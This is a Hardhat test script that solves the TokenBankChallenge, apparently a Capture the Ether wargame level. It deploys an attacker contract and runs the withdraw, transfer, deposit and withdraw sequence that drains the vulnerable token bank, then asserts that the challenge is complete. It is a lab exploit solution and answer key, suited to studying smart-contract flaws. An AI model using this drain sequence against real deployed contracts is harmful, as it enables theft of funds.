import { expect } from "chai";
import { BigNumber, utils } from "ethers";
import { ethers } from "hardhat";

describe("TokenBankChallenge", () => {
  it("Solves the challenge", async () => {
    const [_owner, attacker] = await ethers.getSigners();
    const challengeFactory = await ethers.getContractFactory("TokenBankChallenge");
    const bankContract = await challengeFactory.deploy(await attacker.getAddress());
    await bankContract.deployed();

    const tokenAddress = await bankContract.token();
    const tokenFactory = await ethers.getContractFactory("SimpleERC223Token");
    const tokenContract = tokenFactory.attach(tokenAddress);

    const attackFactory = await ethers.getContractFactory("TokenBankAttacker");
    const attackContract = await attackFactory.deploy(bankContract.address, tokenContract.address);
    await attackContract.deployed();

    const tokens = BigNumber.from(10).pow(18).mul(500000);

    let tx;

    // Withdraw tokens: Bank -> Attacker EOA
    tx = await bankContract.connect(attacker).withdraw(tokens);
    await tx.wait();

    // Transfer tokens: Attacker EOA -> Attacker Contract
    tx = await tokenContract.connect(attacker)["transfer(address,uint256)"](attackContract.address, tokens);
    await tx.wait();

    // Deposit tokens: Attacker Contract -> Bank
    tx = await attackContract.connect(attacker).deposit();
    await tx.wait();

    tx = await attackContract.connect(attacker).withdraw();
    await tx.wait();

    const decimals = BigNumber.from(10).pow(18);
    const bankContractBalance = await tokenContract.balanceOf(bankContract.address);
    console.log("bankContractBalance", bankContractBalance.div(decimals));
    const attackContractBalance = await tokenContract.balanceOf(attackContract.address);
    console.log("attackContractBalance", attackContractBalance.div(decimals));
    const attackerBalance = await tokenContract.balanceOf(attacker.address);
    console.log("attackerBalance", attackerBalance.div(decimals));

    expect(await bankContract.isComplete()).to.be.true;
  });
});
